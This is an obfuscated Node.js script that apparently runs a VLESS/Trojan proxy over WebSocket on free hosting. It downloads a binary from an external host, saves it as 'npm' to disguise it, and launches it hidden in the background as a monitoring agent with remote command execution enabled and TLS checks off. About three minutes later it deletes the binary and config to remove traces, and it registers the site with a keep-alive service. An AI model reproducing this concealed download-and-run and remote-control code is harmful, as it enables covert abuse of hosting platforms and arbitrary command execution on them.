function _0x34bf(_0x462767,_0x190f47){_0x462767=_0x462767-0x169;const _0x47ce3b=_0x47ce();let _0x34bf10=_0x47ce3b[_0x462767];return _0x34bf10;}const _0x5780d6=_0x34bf;(function(_0x3bdf17,_0x44d3e5){const _0x2273cc=_0x34bf,_0x4405aa=_0x3bdf17();while(!![]){try{const _0x6820b6=parseInt(_0x2273cc(0x197))/0x1+parseInt(_0x2273cc(0x1ce))/0x2+parseInt(_0x2273cc(0x1d9))/0x3+parseInt(_0x2273cc(0x19b))/0x4*(-parseInt(_0x2273cc(0x1c7))/0x5)+parseInt(_0x2273cc(0x172))/0x6+parseInt(_0x2273cc(0x1bf))/0x7+parseInt(_0x2273cc(0x1ae))/0x8*(-parseInt(_0x2273cc(0x180))/0x9);if(_0x6820b6===_0x44d3e5)break;else _0x4405aa['push'](_0x4405aa['shift']());}catch(_0x313d11){_0x4405aa['push'](_0x4405aa['shift']());}}}(_0x47ce,0xee841));function _0x47ce(){const _0x1f84cb=['pop','error','2053','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','readUInt16BE','close','index.html','vless://','finish','9NzwGVb','text/html','sub','8.8.4.4','Unknown','application/json','2096','2083','from','replace','path','--tls',':443?encryption=none&security=tls&sni=','once','createWriteStream','Hugging','log','443','toString','NEZHA_SERVER','NEZHA_KEY','every','length','1832166CLwQyk','url','send','digest','68zOYXVL','connection','crypto','true','Server\x20is\x20running\x20on\x20port\x20','axios','Answer','env','decode','Server','listen','WSPATH','config.yaml','trojan://','UUID','http','writeHead','setsid\x20nohup\x20./npm\x20-s\x20','npm\x20is\x20already\x20running,\x20skip\x20running...','19409408lKlLoY','then','end','get','catch','hex','write','Automatic\x20Access\x20Task\x20added\x20successfully','https://arm64.ssss.nyc.mn/v1','substr','&type=A','sha224','application/dns-json','https://amd64.ssss.nyc.mn/agent','concat','buffer','\x20-p\x20','7292936LYEhuT','data','message','slice','readUInt8','text/plain','net','connect','161435Lwkibw','npm\x20running\x20error:','update','readFile','includes','2087','PORT','611444tCzoEI','createServer','DOMAIN','reduce','child_process','Not\x20Found\x0a',':443?security=tls&sni=','chmod\x20+x\x20npm','type','&fp=chrome&type=ws&host=','1.1.1.1','1632492mwjVMt','utf8','pipe','utf-8','npm','https://arm64.ssss.nyc.mn/agent','map','join','test','client_secret:\x20','split','1368696LvUXVi','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','&path=%2F','post','Hello\x20world!'];_0x47ce=function(){return _0x1f84cb;};return _0x47ce();}const os=require('os'),http=require(_0x5780d6(0x1aa)),fs=require('fs'),axios=require(_0x5780d6(0x1a0)),net=require(_0x5780d6(0x1c5)),path=require(_0x5780d6(0x18a)),crypto=require(_0x5780d6(0x19d)),{Buffer}=require(_0x5780d6(0x1bd)),{exec,execSync}=require(_0x5780d6(0x1d2)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x5780d6(0x1a2)][_0x5780d6(0x1a9)]||'fe4c7abc-f8a7-4b34-abe8-9e2c62886097',NEZHA_SERVER=process[_0x5780d6(0x1a2)][_0x5780d6(0x193)]||'',NEZHA_PORT=process[_0x5780d6(0x1a2)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x5780d6(0x1a2)][_0x5780d6(0x194)]||'',DOMAIN=process[_0x5780d6(0x1a2)][_0x5780d6(0x1d0)]||'',AUTO_ACCESS=process[_0x5780d6(0x1a2)]['AUTO_ACCESS']||![],WSPATH=process[_0x5780d6(0x1a2)][_0x5780d6(0x1a6)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x5780d6(0x1a2)]['SUB_PATH']||_0x5780d6(0x182),NAME=process[_0x5780d6(0x1a2)]['NAME']||_0x5780d6(0x18f),PORT=process[_0x5780d6(0x1a2)][_0x5780d6(0x1cd)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1740f2=_0x5780d6;try{const _0x2ba8b=await axios[_0x1740f2(0x1b1)]('https://api.ip.sb/geoip'),_0x4d2e4e=_0x2ba8b[_0x1740f2(0x1c0)];ISP=(_0x4d2e4e['country_code']+'-'+_0x4d2e4e['isp'])[_0x1740f2(0x189)](/ /g,'_');}catch(_0x3547bd){ISP=_0x1740f2(0x184);}};GetISP();const httpServer=http[_0x5780d6(0x1cf)]((_0x1f7371,_0x12f066)=>{const _0x4c75a7=_0x5780d6;if(_0x1f7371[_0x4c75a7(0x198)]==='/'){const _0x3a238b=path[_0x4c75a7(0x16e)](__dirname,_0x4c75a7(0x17d));fs[_0x4c75a7(0x1ca)](_0x3a238b,_0x4c75a7(0x1da),(_0x4c54f8,_0x3d72bf)=>{const _0x485b32=_0x4c75a7;if(_0x4c54f8){_0x12f066['writeHead'](0xc8,{'Content-Type':_0x485b32(0x181)}),_0x12f066[_0x485b32(0x1b0)](_0x485b32(0x176));return;}_0x12f066[_0x485b32(0x1ab)](0xc8,{'Content-Type':_0x485b32(0x181)}),_0x12f066['end'](_0x3d72bf);});return;}else{if(_0x1f7371[_0x4c75a7(0x198)]==='/'+SUB_PATH){const _0x46c926=NAME?NAME+'-'+ISP:ISP,_0x5dda06=_0x4c75a7(0x17e)+UUID+'@'+DOMAIN+_0x4c75a7(0x18c)+DOMAIN+_0x4c75a7(0x1d7)+DOMAIN+_0x4c75a7(0x174)+WSPATH+'#'+_0x46c926,_0x16a128=_0x4c75a7(0x1a8)+UUID+'@'+DOMAIN+_0x4c75a7(0x1d4)+DOMAIN+_0x4c75a7(0x1d7)+DOMAIN+_0x4c75a7(0x174)+WSPATH+'#'+_0x46c926,_0x1a3398=_0x5dda06+'\x0a'+_0x16a128,_0x4e1e7e=Buffer[_0x4c75a7(0x188)](_0x1a3398)[_0x4c75a7(0x192)]('base64');_0x12f066[_0x4c75a7(0x1ab)](0xc8,{'Content-Type':'text/plain'}),_0x12f066[_0x4c75a7(0x1b0)](_0x4e1e7e+'\x0a');}else _0x12f066[_0x4c75a7(0x1ab)](0x194,{'Content-Type':_0x4c75a7(0x1c4)}),_0x12f066['end'](_0x4c75a7(0x1d3));}}),wss=new WebSocket[(_0x5780d6(0x1a4))]({'server':httpServer}),uuid=UUID[_0x5780d6(0x189)](/-/g,''),DNS_SERVERS=[_0x5780d6(0x183),_0x5780d6(0x1d8)];function resolveHost(_0x39c18b){return new Promise((_0x1d3fd1,_0x5c3aa4)=>{const _0x3fe5d6=_0x34bf;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3fe5d6(0x16f)](_0x39c18b)){_0x1d3fd1(_0x39c18b);return;}let _0x3a7d75=0x0;function _0x59b822(){const _0x21e2dc=_0x3fe5d6;if(_0x3a7d75>=DNS_SERVERS[_0x21e2dc(0x196)]){_0x5c3aa4(new Error('Failed\x20to\x20resolve\x20'+_0x39c18b+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x52859e=DNS_SERVERS[_0x3a7d75];_0x3a7d75++;const _0x56ff8a='https://dns.google/resolve?name='+encodeURIComponent(_0x39c18b)+_0x21e2dc(0x1b8);axios[_0x21e2dc(0x1b1)](_0x56ff8a,{'timeout':0x1388,'headers':{'Accept':_0x21e2dc(0x1ba)}})[_0x21e2dc(0x1af)](_0x56b7fa=>{const _0x285f89=_0x21e2dc,_0x17c468=_0x56b7fa[_0x285f89(0x1c0)];if(_0x17c468['Status']===0x0&&_0x17c468[_0x285f89(0x1a1)]&&_0x17c468[_0x285f89(0x1a1)]['length']>0x0){const _0xdceaa3=_0x17c468[_0x285f89(0x1a1)]['find'](_0xfe1c61=>_0xfe1c61[_0x285f89(0x1d6)]===0x1);if(_0xdceaa3){_0x1d3fd1(_0xdceaa3[_0x285f89(0x1c0)]);return;}}_0x59b822();})['catch'](_0x11ce7e=>{_0x59b822();});}_0x59b822();});}function handleVlessConnection(_0x1186ea,_0x1ad21a){const _0x54e8f4=_0x5780d6,[_0x16755a]=_0x1ad21a,_0x216523=_0x1ad21a[_0x54e8f4(0x1c2)](0x1,0x11);if(!_0x216523[_0x54e8f4(0x195)]((_0x4afc86,_0x49b81e)=>_0x4afc86==parseInt(uuid[_0x54e8f4(0x1b7)](_0x49b81e*0x2,0x2),0x10)))return![];let _0x224670=_0x1ad21a[_0x54e8f4(0x1c2)](0x11,0x12)['readUInt8']()+0x13;const _0x1f14b3=_0x1ad21a[_0x54e8f4(0x1c2)](_0x224670,_0x224670+=0x2)[_0x54e8f4(0x17b)](0x0),_0x27b194=_0x1ad21a[_0x54e8f4(0x1c2)](_0x224670,_0x224670+=0x1)[_0x54e8f4(0x1c3)](),_0x5201a7=_0x27b194==0x1?_0x1ad21a[_0x54e8f4(0x1c2)](_0x224670,_0x224670+=0x4)[_0x54e8f4(0x16e)]('.'):_0x27b194==0x2?new TextDecoder()[_0x54e8f4(0x1a3)](_0x1ad21a[_0x54e8f4(0x1c2)](_0x224670+0x1,_0x224670+=0x1+_0x1ad21a['slice'](_0x224670,_0x224670+0x1)[_0x54e8f4(0x1c3)]())):_0x27b194==0x3?_0x1ad21a['slice'](_0x224670,_0x224670+=0x10)[_0x54e8f4(0x1d1)]((_0x497285,_0x4059c5,_0x14ed10,_0x34fa0d)=>_0x14ed10%0x2?_0x497285[_0x54e8f4(0x1bc)](_0x34fa0d[_0x54e8f4(0x1c2)](_0x14ed10-0x1,_0x14ed10+0x1)):_0x497285,[])[_0x54e8f4(0x16d)](_0x4e497c=>_0x4e497c['readUInt16BE'](0x0)['toString'](0x10))[_0x54e8f4(0x16e)](':'):'';_0x1186ea[_0x54e8f4(0x199)](new Uint8Array([_0x16755a,0x0]));const _0x4e7042=createWebSocketStream(_0x1186ea);return resolveHost(_0x5201a7)[_0x54e8f4(0x1af)](_0x18dcd7=>{net['connect']({'host':_0x18dcd7,'port':_0x1f14b3},function(){const _0x413611=_0x34bf;this[_0x413611(0x1b4)](_0x1ad21a[_0x413611(0x1c2)](_0x224670)),_0x4e7042['on'](_0x413611(0x178),()=>{})[_0x413611(0x169)](this)['on'](_0x413611(0x178),()=>{})[_0x413611(0x169)](_0x4e7042);})['on']('error',()=>{});})[_0x54e8f4(0x1b2)](_0x544eae=>{const _0x27c9f8=_0x54e8f4;net['connect']({'host':_0x5201a7,'port':_0x1f14b3},function(){const _0x131f92=_0x34bf;this['write'](_0x1ad21a[_0x131f92(0x1c2)](_0x224670)),_0x4e7042['on'](_0x131f92(0x178),()=>{})[_0x131f92(0x169)](this)['on'](_0x131f92(0x178),()=>{})[_0x131f92(0x169)](_0x4e7042);})['on'](_0x27c9f8(0x178),()=>{});}),!![];}function handleTrojanConnection(_0x30dbde,_0x368cd6){const _0x452366=_0x5780d6;try{if(_0x368cd6[_0x452366(0x196)]<0x3a)return![];const _0x19074e=_0x368cd6[_0x452366(0x1c2)](0x0,0x38)[_0x452366(0x192)](),_0x356193=[UUID];let _0x4436c1=null;for(const _0x4b0ebe of _0x356193){const _0x43ed72=crypto['createHash'](_0x452366(0x1b9))[_0x452366(0x1c9)](_0x4b0ebe)[_0x452366(0x19a)](_0x452366(0x1b3));if(_0x43ed72===_0x19074e){_0x4436c1=_0x4b0ebe;break;}}if(!_0x4436c1)return![];let _0x487132=0x38;_0x368cd6[_0x487132]===0xd&&_0x368cd6[_0x487132+0x1]===0xa&&(_0x487132+=0x2);const _0x26083f=_0x368cd6[_0x487132];if(_0x26083f!==0x1)return![];_0x487132+=0x1;const _0xa628f0=_0x368cd6[_0x487132];_0x487132+=0x1;let _0x8619f3,_0x324c9e;if(_0xa628f0===0x1)_0x8619f3=_0x368cd6['slice'](_0x487132,_0x487132+0x4)[_0x452366(0x16e)]('.'),_0x487132+=0x4;else{if(_0xa628f0===0x3){const _0x285de5=_0x368cd6[_0x487132];_0x487132+=0x1,_0x8619f3=_0x368cd6[_0x452366(0x1c2)](_0x487132,_0x487132+_0x285de5)['toString'](),_0x487132+=_0x285de5;}else{if(_0xa628f0===0x4)_0x8619f3=_0x368cd6['slice'](_0x487132,_0x487132+0x10)[_0x452366(0x1d1)]((_0x478d3d,_0x4d66d6,_0x190526,_0x2b8222)=>_0x190526%0x2?_0x478d3d[_0x452366(0x1bc)](_0x2b8222[_0x452366(0x1c2)](_0x190526-0x1,_0x190526+0x1)):_0x478d3d,[])[_0x452366(0x16d)](_0x4101dc=>_0x4101dc['readUInt16BE'](0x0)[_0x452366(0x192)](0x10))[_0x452366(0x16e)](':'),_0x487132+=0x10;else return![];}}_0x324c9e=_0x368cd6[_0x452366(0x17b)](_0x487132),_0x487132+=0x2;_0x487132<_0x368cd6[_0x452366(0x196)]&&_0x368cd6[_0x487132]===0xd&&_0x368cd6[_0x487132+0x1]===0xa&&(_0x487132+=0x2);const _0x23e374=createWebSocketStream(_0x30dbde);return resolveHost(_0x8619f3)[_0x452366(0x1af)](_0x1b515b=>{const _0x17de3d=_0x452366;net[_0x17de3d(0x1c6)]({'host':_0x1b515b,'port':_0x324c9e},function(){const _0x4ebc14=_0x17de3d;_0x487132<_0x368cd6[_0x4ebc14(0x196)]&&this[_0x4ebc14(0x1b4)](_0x368cd6[_0x4ebc14(0x1c2)](_0x487132)),_0x23e374['on']('error',()=>{})[_0x4ebc14(0x169)](this)['on'](_0x4ebc14(0x178),()=>{})[_0x4ebc14(0x169)](_0x23e374);})['on'](_0x17de3d(0x178),()=>{});})['catch'](_0xa1e089=>{const _0x29016c=_0x452366;net[_0x29016c(0x1c6)]({'host':_0x8619f3,'port':_0x324c9e},function(){const _0x385130=_0x29016c;_0x487132<_0x368cd6[_0x385130(0x196)]&&this[_0x385130(0x1b4)](_0x368cd6[_0x385130(0x1c2)](_0x487132)),_0x23e374['on'](_0x385130(0x178),()=>{})[_0x385130(0x169)](this)['on'](_0x385130(0x178),()=>{})[_0x385130(0x169)](_0x23e374);})['on']('error',()=>{});}),!![];}catch(_0xbeee27){return![];}}wss['on'](_0x5780d6(0x19c),(_0x14fcb9,_0x23ed38)=>{const _0x3e2e91=_0x5780d6,_0x465c6a=_0x23ed38[_0x3e2e91(0x198)]||'';_0x14fcb9[_0x3e2e91(0x18d)](_0x3e2e91(0x1c1),_0x3782fb=>{const _0x3d36e6=_0x3e2e91;if(_0x3782fb['length']>0x11&&_0x3782fb[0x0]===0x0){const _0x1d73f9=_0x3782fb['slice'](0x1,0x11),_0x45dad2=_0x1d73f9[_0x3d36e6(0x195)]((_0x501e3d,_0x515496)=>_0x501e3d==parseInt(uuid[_0x3d36e6(0x1b7)](_0x515496*0x2,0x2),0x10));if(_0x45dad2){!handleVlessConnection(_0x14fcb9,_0x3782fb)&&_0x14fcb9['close']();return;}}!handleTrojanConnection(_0x14fcb9,_0x3782fb)&&_0x14fcb9[_0x3d36e6(0x17c)]();})['on'](_0x3e2e91(0x178),()=>{});});const getDownloadUrl=()=>{const _0x3fb3f1=_0x5780d6,_0x222f63=os['arch']();return _0x222f63==='arm'||_0x222f63==='arm64'||_0x222f63==='aarch64'?!NEZHA_PORT?_0x3fb3f1(0x1b6):_0x3fb3f1(0x16c):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x3fb3f1(0x1bb);},downloadFile=async()=>{const _0x1f0983=_0x5780d6;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xc1f8de=getDownloadUrl(),_0x3b0ebf=await axios({'method':_0x1f0983(0x1b1),'url':_0xc1f8de,'responseType':'stream'}),_0x2043d5=fs[_0x1f0983(0x18e)](_0x1f0983(0x16b));return _0x3b0ebf[_0x1f0983(0x1c0)]['pipe'](_0x2043d5),new Promise((_0x4d1487,_0x446902)=>{const _0x3e3440=_0x1f0983;_0x2043d5['on'](_0x3e3440(0x17f),()=>{const _0x335da6=_0x3e3440;console['log']('npm\x20download\x20successfully'),exec(_0x335da6(0x1d5),_0x36005b=>{if(_0x36005b)_0x446902(_0x36005b);_0x4d1487();});}),_0x2043d5['on'](_0x3e3440(0x178),_0x446902);});}catch(_0x481c53){throw _0x481c53;}},runnz=async()=>{const _0x43bd80=_0x5780d6;try{const _0x31d96f=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x43bd80(0x16a)});if(_0x31d96f['trim']()!==''){console[_0x43bd80(0x190)](_0x43bd80(0x1ad));return;}}catch(_0x40be9e){}await downloadFile();let _0x252ff2='',_0xdafe0b=[_0x43bd80(0x191),'8443',_0x43bd80(0x186),_0x43bd80(0x1cc),_0x43bd80(0x187),_0x43bd80(0x179)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2bc217=_0xdafe0b[_0x43bd80(0x1cb)](NEZHA_PORT)?_0x43bd80(0x18b):'';_0x252ff2=_0x43bd80(0x1ac)+NEZHA_SERVER+':'+NEZHA_PORT+_0x43bd80(0x1be)+NEZHA_KEY+'\x20'+_0x2bc217+_0x43bd80(0x173);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x14cf87=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x43bd80(0x171)](':')[_0x43bd80(0x177)]():'',_0x17d016=_0xdafe0b['includes'](_0x14cf87)?_0x43bd80(0x19e):'false',_0xc820a3=_0x43bd80(0x170)+NEZHA_KEY+_0x43bd80(0x17a)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x17d016+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x43bd80(0x1a7),_0xc820a3);}_0x252ff2='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x43bd80(0x190)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x252ff2,{'shell':'/bin/bash'},_0x9c493f=>{const _0x4438ab=_0x43bd80;if(_0x9c493f)console[_0x4438ab(0x178)](_0x4438ab(0x1c8),_0x9c493f);else console[_0x4438ab(0x190)]('npm\x20is\x20running');});}catch(_0x5b8883){console[_0x43bd80(0x178)]('error:\x20'+_0x5b8883);}};async function addAccessTask(){const _0x42b505=_0x5780d6;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2257a3='https://'+DOMAIN;try{const _0x14d2c4=await axios[_0x42b505(0x175)]('https://oooo.serv00.net/add-url',{'url':_0x2257a3},{'headers':{'Content-Type':_0x42b505(0x185)}});console[_0x42b505(0x190)](_0x42b505(0x1b5));}catch(_0x5a34b3){}}const delFiles=()=>{const _0x9910ae=_0x5780d6;fs['unlink'](_0x9910ae(0x16b),()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer[_0x5780d6(0x1a5)](PORT,()=>{const _0x40d377=_0x5780d6;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x40d377(0x190)](_0x40d377(0x19f)+PORT);});
